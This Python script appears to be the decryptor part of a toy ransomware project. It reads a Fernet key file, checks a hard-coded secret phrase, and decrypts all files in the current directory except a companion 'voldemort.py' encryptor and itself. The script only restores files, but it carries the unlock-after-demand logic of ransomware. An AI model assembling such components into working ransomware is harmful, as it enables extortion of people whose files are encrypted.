#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Check if the key file exists
if not os.path.exists("thekey.key"):
    print("Error: Key file not found.")
    exit()

# Read the encryption key from the file
with open("thekey.key", "rb") as key:
    secretkey = key.read()

# Prompt the user for the secret phrase
secretphrase = input("Enter the secret phrase to decrypt your files: ")

# Check if the user entered the correct secret phrase
if secretphrase == "coffee":
    # List all encrypted files
    files = []
    for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print("Found the following encrypted files:")
    for file in files:
        print(file)

    # Decrypt all encrypted files
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()

        try:
            # Decrypt the file contents
            contents_decrypted = Fernet(secretkey).decrypt(contents)

            # Write the decrypted contents back to the file
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
                print(f"{file} decrypted successfully.")
        except Exception as e:
            print(f"Error decrypting {file}: {e}")

else:
    print("Wrong secret phrase.")
